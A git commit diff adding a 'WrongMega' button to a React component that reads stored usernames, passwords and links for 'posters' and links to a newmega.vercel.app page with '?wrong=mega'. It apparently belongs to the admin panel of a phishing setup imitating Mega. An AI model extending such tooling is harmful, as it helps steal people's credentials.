357c457d01fc02fc314e2d7989622fb8b2ff3530
shovonroy173 <shovonroy2003@gmail.com>
2025-04-10 20:01:44 +0600

    mod: in  wrong mega button added newmega-frontend link

--- components/WrongMega.js
+++ components/WrongMega.js
@@ -3,6 +3,24 @@ import { API_URL } from "../config/index";
 
 function WrongMega({ id }) {
   console.log(id);
+  const { query } = useRouter();
+  const { posterDetailsId } = query;
+  const { data, isLoading } = useGetData(`/posters/details/${posterDetailsId}`);
+
+  const { _doc, details } = data ? data?.data?.data : "";
+
+  const { username, password, links } = _doc ? _doc : "";
+
+  console.log("LINE AT 14", links);
+  const parts = links && new URL(links[0]).pathname.split("/").filter(Boolean);
+
+  // Assign values
+  const adminId = parts[0]; // "987"
+  const posterId = parts[1]; // "vht"
+
+  console.log("adminId:", adminId);
+  console.log("posterId:", posterId);
+
   const handleWrongPass = async () => {
     const values = {
       id,
@@ -24,12 +42,15 @@ function WrongMega({ id }) {
       console.log("error", data);
     }
   };
+
   return (
     <button
       onClick={handleWrongPass}
       className="bg-red-600 text-xs text-white font-semibold px-2 py-1 rounded"
     >
-      WrongMega
+      <a href={`https://newmega.vercel.app/${adminId}/${posterId}?wrong=mega`}>
+        WrongMega
+      </a>
     </button>
   );
 }
